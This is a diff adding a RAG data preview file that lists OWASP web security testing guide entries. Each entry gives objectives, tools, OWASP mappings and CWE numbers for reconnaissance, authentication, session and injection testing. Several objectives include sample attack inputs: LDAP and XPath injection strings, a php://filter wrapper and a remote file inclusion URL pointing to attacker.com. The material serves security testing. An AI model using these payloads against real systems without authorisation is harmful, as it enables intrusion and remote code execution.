@@ -1,0 +1,1096 @@
+=== XEM TRƯỚC DỮ LIỆU SẼ ĐƯỢC ĐƯA VÀO VECTOR RAG ===
+
+--- [Mục dữ liệu thứ 1] ---
+ID: WSTG-INFO-01
+Tên kiểm thử (Name): Conduct Search Engine Discovery Reconnaissance for Information Leakage
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): - Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's website) or indirectly (via third-party services).
+Công cụ đề xuất (Tools): Google Hacking, Shodan, Recon-ng
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 2] ---
+ID: WSTG-INFO-02
+Tên kiểm thử (Name): Fingerprint Web Server
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): - Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.
+Công cụ đề xuất (Tools): Wappalyzer, Nikto
+OWASP Top 10 Liên quan: A5, A6
+CWE: CWE-756, CWE-1352
+
+--- [Mục dữ liệu thứ 3] ---
+ID: WSTG-INFO-03
+Tên kiểm thử (Name): Review Webserver Metafiles for Information Leakage
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): - Identify hidden or obfuscated paths and functionality through the analysis of metadata files (robots.txt, <META> tag, sitemap.xml)
+- Extract and map other information that could lead to a better understanding of the systems at hand.
+Công cụ đề xuất (Tools): Browser, Curl, Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1
+CWE: CWE-200
+
+--- [Mục dữ liệu thứ 4] ---
+ID: WSTG-INFO-04
+Tên kiểm thử (Name): Enumerate Applications on Webserver
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): - Enumerate the applications within the scope that exist on a web server.
+- Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers
+Công cụ đề xuất (Tools): dnsrecon, Nmap
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 5] ---
+ID: WSTG-INFO-05
+Tên kiểm thử (Name): Review Webpage Content for Information Leakage
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): - Review webpage comments, metadata, and redirect bodies to find any information leakage.
+- Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.
+- Identify if source map files or other front-end debug files exist.
+Công cụ đề xuất (Tools): Browser, Curl, Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1
+CWE: CWE-200, CWE-540
+
+--- [Mục dữ liệu thứ 6] ---
+ID: WSTG-INFO-06
+Tên kiểm thử (Name): Identify Application Entry Points
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): - Identify possible entry and injection points through request and response analysis which covers hidden fields, parameters, methods HTTP header analysis
+Công cụ đề xuất (Tools): OWASP ASD, Burpsuite/ZAP
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 7] ---
+ID: WSTG-INFO-07
+Tên kiểm thử (Name): Map Execution Paths Through Application
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): - Map the target application and understand the principal workflows.
+- Use HTTP(s) Proxy Spider/Crawler feature aligned with application walkthrough
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 8] ---
+ID: WSTG-INFO-08
+Tên kiểm thử (Name): Fingerprint Web Application Framework
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): - Fingerprint the components being used by the web applications.
+- Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders, Error message.
+Công cụ đề xuất (Tools): Whatweb, Wappalyzer, CMSMap
+OWASP Top 10 Liên quan: A5, A6
+CWE: CWE-756, CWE-1104
+
+--- [Mục dữ liệu thứ 9] ---
+ID: WSTG-INFO-09
+Tên kiểm thử (Name): Fingerprint Web Application
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): N/A, This content has been merged into: WSTG-INFO-08
+Công cụ đề xuất (Tools): NA
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 10] ---
+ID: WSTG-INFO-10
+Tên kiểm thử (Name): Map Application Architecture
+Hạng mục (Category): 1. Information Gathering
+Mục tiêu (Objectives): - Understand the architecture of the application and the technologies in use.
+- Identify application architecture whether on Application and Network components:
+Applicaton: Web server, CMS, PaaS, Serverless, Microservices, Static storage, Third party services/APIs
+Network and Security: Reverse proxy, IPS, WAF
+Công cụ đề xuất (Tools): WAFW00F, Nmap
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 11] ---
+ID: WSTG-CONF-01
+Tên kiểm thử (Name): Test Network Infrastructure Configuration
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Review the applications' configurations set across the network and validate that they are not vulnerable.
+- Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.
+Công cụ đề xuất (Tools): Nessus, Nmap
+OWASP Top 10 Liên quan: A1, A5, A6
+CWE: CWE-284, CWE-1349, CWE-1352
+
+--- [Mục dữ liệu thứ 12] ---
+ID: WSTG-CONF-02
+Tên kiểm thử (Name): Test Application Platform Configuration
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Ensure that defaults and known files have been removed.
+- Review configuration and server handling (40*, 50*)
+- Validate that no debugging code or extensions are left in the production environments.
+- Review the logging mechanisms set in place for the application including Log Location, Log Storage , Log Rotation, Log Access Control, Log Review
+Công cụ đề xuất (Tools): Browser, Nikto, CIS Benchmarks
+OWASP Top 10 Liên quan: A1, A5, A9
+CWE: CWE-13, CWE-117, CWE-223, CWE-200, CWE-201, CWE-489, CWE-532, CWE-548, CWE-651, CWE-778
+
+--- [Mục dữ liệu thứ 13] ---
+ID: WSTG-CONF-03
+Tên kiểm thử (Name): Test File Extensions Handling for Sensitive Information
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Dirbust sensitive file extensions, or extensions that might contain raw data (*e.g.* scripts, raw data, credentials, etc.).
+- Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)
+- Validate that no system framework bypasses exist on the rules set.
+Công cụ đề xuất (Tools): Browser, Nikto, DirSearch, ffuf
+OWASP Top 10 Liên quan: A1
+CWE: CWE-200, CWE-425, CWE-552
+
+--- [Mục dữ liệu thứ 14] ---
+ID: WSTG-CONF-04
+Tên kiểm thử (Name): Review Old Backup and Unreferenced Files for Sensitive Information
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Find and analyse unreferenced files that might contain sensitive information.
+- Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename
+Công cụ đề xuất (Tools): Browser, Nikto, DirSearch, ffuf
+OWASP Top 10 Liên quan: A1
+CWE: CWE-200, CWE-531, CWE-538
+
+--- [Mục dữ liệu thứ 15] ---
+ID: WSTG-CONF-05
+Tên kiểm thử (Name): Enumerate Infrastructure and Application Admin Interfaces
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Identify hidden administrator interfaces and functionality.
+- Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)
+Công cụ đề xuất (Tools): Burpsuite/ZAP, DirSearch, ffuf
+OWASP Top 10 Liên quan: A1, A4
+CWE: CWE-284, CWE-419
+
+--- [Mục dữ liệu thứ 16] ---
+ID: WSTG-CONF-06
+Tên kiểm thử (Name): Test HTTP Methods
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Enumerate supported HTTP methods using OPTIONS
+- Test for access control bypass (GET->HEAD->FOO)
+- Test HTTP method overriding techniques.
+Công cụ đề xuất (Tools): netcat, curl
+OWASP Top 10 Liên quan: A5
+CWE: CWE-650, CWE-749
+
+--- [Mục dữ liệu thứ 17] ---
+ID: WSTG-CONF-07
+Tên kiểm thử (Name): Test HTTP Strict Transport Security
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Review the HSTS header and its validity.
+- Identify HSTS header on Web server through HTTP response header:
+curl -s -D- https://domain.com/ | grep Strict
+Công cụ đề xuất (Tools): Burpsuite/ZAP, curl
+OWASP Top 10 Liên quan: A5
+CWE: CWE-523
+
+--- [Mục dữ liệu thứ 18] ---
+ID: WSTG-CONF-08
+Tên kiểm thử (Name): Test RIA Cross Domain Policy
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.
+Công cụ đề xuất (Tools): Burpsuite/ZAP, curl
+OWASP Top 10 Liên quan: A5
+CWE: CWE-942
+
+--- [Mục dữ liệu thứ 19] ---
+ID: WSTG-CONF-09
+Tên kiểm thử (Name): Test File Permission
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Review and Identify any rogue file permissions.
+- Identify configuration file whose permissions are set to world-readable from the installation by default.
+Công cụ đề xuất (Tools): Burpsuite/ZAP, Nikto
+OWASP Top 10 Liên quan: A1, A5
+CWE: CWE-552, CWE-732
+
+--- [Mục dữ liệu thứ 20] ---
+ID: WSTG-CONF-10
+Tên kiểm thử (Name): Test for Subdomain Takeover
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Enumerate all possible domains (previous and current).
+- Identify forgotten or misconfigured domains.
+Công cụ đề xuất (Tools): Dnsrecon
+OWASP Top 10 Liên quan: NA
+CWE: CWE-673
+
+--- [Mục dữ liệu thứ 21] ---
+ID: WSTG-CONF-11
+Tên kiểm thử (Name): Test Cloud Storage
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Assess that the access control configuration for the storage services is properly in place.
+Công cụ đề xuất (Tools): AWS CLI, S3Scanner
+OWASP Top 10 Liên quan: A1
+CWE: CWE-264
+
+--- [Mục dữ liệu thứ 22] ---
+ID: WSTG-CONF-12
+Tên kiểm thử (Name): Testing for Content Security Policy
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Review the Content-Security-Policy header or meta element to identify misconfigurations.
+Công cụ đề xuất (Tools): Burpsuite CSP Auditor
+OWASP Top 10 Liên quan: A5
+CWE: CWE-1021
+
+--- [Mục dữ liệu thứ 23] ---
+ID: WSTG-CONF-13
+Tên kiểm thử (Name): Test Path Confusion
+Hạng mục (Category): 2. Configuration and Deploy Management Testing
+Mục tiêu (Objectives): - Make sure application paths are configured correctly.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A5
+CWE: CWE-436
+
+--- [Mục dữ liệu thứ 24] ---
+ID: WSTG-IDNT-01
+Tên kiểm thử (Name): Test Role Definitions
+Hạng mục (Category): 3. Identity Management Testing
+Mục tiêu (Objectives): - Identify and document roles used by the application.
+- Attempt to switch, change, or access another role.
+- Review the granularity of the roles and the needs behind the permissions given.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-266, CWE-269
+
+--- [Mục dữ liệu thứ 25] ---
+ID: WSTG-IDNT-02
+Tên kiểm thử (Name): Test User Registration Process
+Hạng mục (Category): 3. Identity Management Testing
+Mục tiêu (Objectives): - Verify that the identity requirements for user registration are aligned with business and security requirements.
+- Validate the registration process.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-419
+
+--- [Mục dữ liệu thứ 26] ---
+ID: WSTG-IDNT-03
+Tên kiểm thử (Name): Test Account Provisioning Process
+Hạng mục (Category): 3. Identity Management Testing
+Mục tiêu (Objectives): - Verify which accounts may provision other accounts and of what type.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-269, CWE-280
+
+--- [Mục dữ liệu thứ 27] ---
+ID: WSTG-IDNT-04
+Tên kiểm thử (Name): Testing for Account Enumeration and Guessable User Account
+Hạng mục (Category): 3. Identity Management Testing
+Mục tiêu (Objectives): - Review processes that pertain to user identification (*e.g.* registration, login, etc.).
+- Enumerate users where possible through response analysis.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-204
+
+--- [Mục dữ liệu thứ 28] ---
+ID: WSTG-IDNT-05
+Tên kiểm thử (Name): Testing for Weak or Unenforced Username Policy
+Hạng mục (Category): 3. Identity Management Testing
+Mục tiêu (Objectives): - Determine whether a consistent account name structure renders the application vulnerable to account enumeration.
+- User account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.
+- Determine whether the application's error messages permit account enumeration.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-204
+
+--- [Mục dữ liệu thứ 29] ---
+ID: WSTG-ATHN-01
+Tên kiểm thử (Name): Testing for Credentials Transported over an Encrypted Channel
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): N/A, This content has been merged into: WSTG-CRYP-03
+Công cụ đề xuất (Tools): NA
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 30] ---
+ID: WSTG-ATHN-02
+Tên kiểm thử (Name): Testing for Default Credentials
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Determine whether the application has any User accounts with default passwords.
+Công cụ đề xuất (Tools): Browser, Burpsuite/ZAP, Hydra
+OWASP Top 10 Liên quan: A7
+CWE: CWE-1392
+
+--- [Mục dữ liệu thứ 31] ---
+ID: WSTG-ATHN-03
+Tên kiểm thử (Name): Testing for Weak Lock Out Mechanism
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.
+- Evaluate the unlock mechanism's resistance to unauthorized account unlocking.
+Công cụ đề xuất (Tools): Browser, Burpsuite/ZAP, Hydra
+OWASP Top 10 Liên quan: A7
+CWE: CWE-307
+
+--- [Mục dữ liệu thứ 32] ---
+ID: WSTG-ATHN-04
+Tên kiểm thử (Name): Testing for Bypassing Authentication Schema
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Ensure that authentication is applied across all services that require it.
+- Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1, A7
+CWE: CWE-287, CWE-288, CWE-290, CWE-294, CWE-302, CWE-304, CWE-306, CWE-425, CWE-804
+
+--- [Mục dữ liệu thứ 33] ---
+ID: WSTG-ATHN-05
+Tên kiểm thử (Name): Testing for Vulnerable Remember Password
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Validate that the generated session is managed securely and do not put the user's credentials in danger  (e.g., cookie)
+- Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4, A5
+CWE: CWE-315, CWE-522, CWE-524
+
+--- [Mục dữ liệu thứ 34] ---
+ID: WSTG-ATHN-06
+Tên kiểm thử (Name): Testing for Browser Cache Weaknesses
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Review if the application stores sensitive information on the client-side.
+- Review if access can occur without authorization.
+- Check browser history issue by clicking "Back" button after logging out.
+- Check browser cache issue from HTTP response headers (Cache-Control: no-cache)
+Công cụ đề xuất (Tools): Browser, Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-525
+
+--- [Mục dữ liệu thứ 35] ---
+ID: WSTG-ATHN-07
+Tên kiểm thử (Name): Testing for Weak Password Policy
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Determine the resistance of the application against brute Force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.
+- Review whether new User accounts are created with weak or predictable passwords.
+Công cụ đề xuất (Tools): Burpsuite/ZAP, Hydra
+OWASP Top 10 Liên quan: A7
+CWE: CWE-521, CWE-1391
+
+--- [Mục dữ liệu thứ 36] ---
+ID: WSTG-ATHN-08
+Tên kiểm thử (Name): Testing for Weak Security Question Answer
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Determine the complexity and how straight-forward the questions are (Weak pre-generated questions, Weak self-generated question)
+- Assess possible user answers and brute force capabilities.
+Công cụ đề xuất (Tools): Browser, Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-640
+
+--- [Mục dữ liệu thứ 37] ---
+ID: WSTG-ATHN-09
+Tên kiểm thử (Name): Testing for Weak Password Change or Reset Functionalities
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Determine whether the password change and reset functionality allows accounts to be compromised.
+- Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?)
+- Test password change (Need old password?)
+Công cụ đề xuất (Tools): Browser, Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-620, CWE-640
+
+--- [Mục dữ liệu thứ 38] ---
+ID: WSTG-ATHN-10
+Tên kiểm thử (Name): Testing for Weaker Authentication in Alternative Channel
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Identify alternative authentication channels.
+- Assess the security measures used and if any bypasses exists on the alternative channels.
+Công cụ đề xuất (Tools): Browser, Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-288
+
+--- [Mục dữ liệu thứ 39] ---
+ID: WSTG-ATHN-11
+Tên kiểm thử (Name): Testing Multi-Factor Authentication (MFA)
+Hạng mục (Category): 4. Authentication Testing
+Mục tiêu (Objectives): - Identify the type of MFA used by the application.
+- Determine whether the MFA implementation is robust and secure.
+- Attempt to bypass the MFA.
+Công cụ đề xuất (Tools): Browser, Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-288, CWE-304, CWE-308
+
+--- [Mục dữ liệu thứ 40] ---
+ID: WSTG-ATHZ-01
+Tên kiểm thử (Name): Testing Directory Traversal File Include
+Hạng mục (Category): 5. Authorization Testing
+Mục tiêu (Objectives): - Identify injection points that pertain to path traversal.
+- Assess bypassing techniques and identify the extent of path traversal (dot-dot-slash attack, Local/Remote file inclusion)
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1
+CWE: CWE-22, CWE-23, CWE-35, CWE-829
+
+--- [Mục dữ liệu thứ 41] ---
+ID: WSTG-ATHZ-02
+Tên kiểm thử (Name): Testing for Bypassing Authorization Schema
+Hạng mục (Category): 5. Authorization Testing
+Mục tiêu (Objectives): - Assess if horizontal or vertical access is possible.
+- Access to Administrative functions by force browsing (/admin/addUser)
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1
+CWE: CWE-285, CWE-732, CWE-862, CWE-863
+
+--- [Mục dữ liệu thứ 42] ---
+ID: WSTG-ATHZ-03
+Tên kiểm thử (Name): Testing for Privilege Escalation
+Hạng mục (Category): 5. Authorization Testing
+Mục tiêu (Objectives): - Identify injection points related to role/privilege manipulation. For example: Change some param groupid=2 to groupid=1
+- Verify that it is not possible for a user to modify their privileges or roles inside the application
+- Fuzz or otherwise attempt to bypass security measures.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1
+CWE: CWE-269, CWE-639
+
+--- [Mục dữ liệu thứ 43] ---
+ID: WSTG-ATHZ-04
+Tên kiểm thử (Name): Testing for Insecure Direct Object References
+Hạng mục (Category): 5. Authorization Testing
+Mục tiêu (Objectives): - Identify points where object references may occur.
+- Assess the access control measures and if they're vulnerable to IDOR. For example: Force changing parameter value (?invoice=123 -> ?invoice=456)
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1
+CWE: CWE-639
+
+--- [Mục dữ liệu thứ 44] ---
+ID: WSTG-ATHZ-05
+Tên kiểm thử (Name): Testing for OAuth Weaknesses
+Hạng mục (Category): 5. Authorization Testing
+Mục tiêu (Objectives): - Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1
+CWE: CWE-290, CWE-345, CWE-798
+
+--- [Mục dữ liệu thứ 45] ---
+ID: WSTG-SESS-01
+Tên kiểm thử (Name): Testing for Session Management Schema
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Gather session tokens, for the same user and for different users where possible.
+- Analyze and ensure that enough randomness exists to stop session forging attacks.
+- Modify cookies that are not signed and contain information that can be manipulated.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A2, A4
+CWE: CWE-315, CWE-330, CWE-539, CWE-694
+
+--- [Mục dữ liệu thứ 46] ---
+ID: WSTG-SESS-02
+Tên kiểm thử (Name): Testing for Cookies Attributes
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Ensure that the proper security configuration is set for cookies (HTTPOnly and Secure flag, Samesite=Strict)
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A5
+CWE: CWE-16, CWE-614, CWE-1004, CWE-1275
+
+--- [Mục dữ liệu thứ 47] ---
+ID: WSTG-SESS-03
+Tên kiểm thử (Name): Testing for Session Fixation
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Analyze the authentication mechanism and its flow.
+- Force cookies and assess the impact.
+- Check whether the application renew the cookie after a successfully user authentication.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-384
+
+--- [Mục dữ liệu thứ 48] ---
+ID: WSTG-SESS-04
+Tên kiểm thử (Name): Testing for Exposed Session Variables
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Ensure that proper encryption is implemented (Encryption & Reuse of session Tokens vulnerabilities).
+- Review the caching configuration.
+- Assess the channel and methods' security (Send sessionID with GET method ?)
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-598
+
+--- [Mục dữ liệu thứ 49] ---
+ID: WSTG-SESS-05
+Tên kiểm thử (Name): Testing for Cross Site Request Forgery
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.
+- Conduct URL analysis, Direct access to functions without any token.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1
+CWE: CWE-352
+
+--- [Mục dữ liệu thứ 50] ---
+ID: WSTG-SESS-06
+Tên kiểm thử (Name): Testing for Logout Functionality
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Assess the logout UI.
+- Analyze the session timeout and if the session is properly killed after logout.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-613
+
+--- [Mục dữ liệu thứ 51] ---
+ID: WSTG-SESS-07
+Tên kiểm thử (Name): Testing Session Timeout
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Validate that a hard session timeout exists, after the timeout has passed, all session tokens should be destroyed or be unusable.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-613
+
+--- [Mục dữ liệu thứ 52] ---
+ID: WSTG-SESS-08
+Tên kiểm thử (Name): Testing for Session Puzzling
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Identify all session variables.
+- Break the logical flow of session generation.
+- Check whether the application uses the same session variable for more than one purpose
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-841
+
+--- [Mục dữ liệu thứ 53] ---
+ID: WSTG-SESS-09
+Tên kiểm thử (Name): Testing for Session Hijacking
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Identify vulnerable session cookies.
+- Hijack vulnerable cookies and assess the risk level.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A2
+CWE: CWE-523
+
+--- [Mục dữ liệu thứ 54] ---
+ID: WSTG-SESS-10
+Tên kiểm thử (Name): Testing JSON Web Tokens
+Hạng mục (Category): 6. Session Management Testing
+Mục tiêu (Objectives): - Determine whether the JWTs expose sensitive information.
+- Determine whether the JWTs can be tampered with or modified.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A7
+CWE: CWE-345, CWE-757, CWE-798
+
+--- [Mục dữ liệu thứ 55] ---
+ID: WSTG-INPV-01
+Tên kiểm thử (Name): Testing for Reflected Cross Site Scripting
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify variables that are reflected in responses.
+- Assess the input they accept and the encoding that gets applied on return (if any).
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-79
+
+--- [Mục dữ liệu thứ 56] ---
+ID: WSTG-INPV-02
+Tên kiểm thử (Name): Testing for Stored Cross Site Scripting
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify stored input that is reflected on the client-side.
+- Assess the input they accept and the encoding that gets applied on return (if any).
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-79
+
+--- [Mục dữ liệu thứ 57] ---
+ID: WSTG-INPV-03
+Tên kiểm thử (Name): Testing for HTTP Verb Tampering
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): N/A, This content has been merged into: WSTG-CONF-06
+Công cụ đề xuất (Tools): NA
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 58] ---
+ID: WSTG-INPV-04
+Tên kiểm thử (Name): Testing for HTTP Parameter Pollution
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify the backend and the parsing method used.
+- Assess injection points and try bypassing input filters using HPP.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-235
+
+--- [Mục dữ liệu thứ 59] ---
+ID: WSTG-INPV-05
+Tên kiểm thử (Name): Testing for SQL Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify SQL injection points.
+- Assess the severity of the injection and the level of access that can be achieved through it.
+Công cụ đề xuất (Tools): Burpsuite/ZAP SQLMap, NoSQLMap
+OWASP Top 10 Liên quan: A3
+CWE: CWE-89
+
+--- [Mục dữ liệu thứ 60] ---
+ID: WSTG-INPV-06
+Tên kiểm thử (Name): Testing for LDAP Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify LDAP injection points:
+/ldapsearch?user=*
+user=*user=*)(uid=*))(|(uid=*
+pass=password
+- Assess the severity of the injection:
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-90
+
+--- [Mục dữ liệu thứ 61] ---
+ID: WSTG-INPV-07
+Tên kiểm thử (Name): Testing for XML Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify XML injection points with XML Meta Characters:
+', " , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG
+- Assess the types of exploits that can be attained and their severities.
+Công cụ đề xuất (Tools): Burpsuite/ZAP, Wfuzz
+OWASP Top 10 Liên quan: A5
+CWE: CWE-91, CWE-611, CWE-652
+
+--- [Mục dữ liệu thứ 62] ---
+ID: WSTG-INPV-08
+Tên kiểm thử (Name): Testing for SSI Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify SSI injection points (Presense of .shtml extension) with these characters:
+< ! # = / . " - > and [a-zA-Z0-9]
+- Assess the severity of the injection.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-97
+
+--- [Mục dữ liệu thứ 63] ---
+ID: WSTG-INPV-09
+Tên kiểm thử (Name): Testing for XPath Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify XPATH injection points by checking for XML error enumeration by supplying a single quote ('):
+Username: ‘ or ‘1’ = ‘1
+Password: ‘ or ‘1’ = ‘1
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-91, CWE-643
+
+--- [Mục dữ liệu thứ 64] ---
+ID: WSTG-INPV-10
+Tên kiểm thử (Name): Testing for IMAP SMTP Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify IMAP/SMTP injection points (Header, Body, Footer) with special characters (i.e.: \, ‘, “, @, #, !, |)
+- Understand the data flow and deployment structure of the system.
+- Assess the injection impacts.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-147
+
+--- [Mục dữ liệu thứ 65] ---
+ID: WSTG-INPV-11
+Tên kiểm thử (Name): Testing for Code Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify injection points where you can inject code into the application. 
+- Check LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource).
+- Check RFI from malicious URL 
+?page.php?file=http://attacker.com/malicious_page
+- Assess the injection severity.
+Công cụ đề xuất (Tools): Burpsuite/ZAP, Liffy, LFImap
+OWASP Top 10 Liên quan: A3
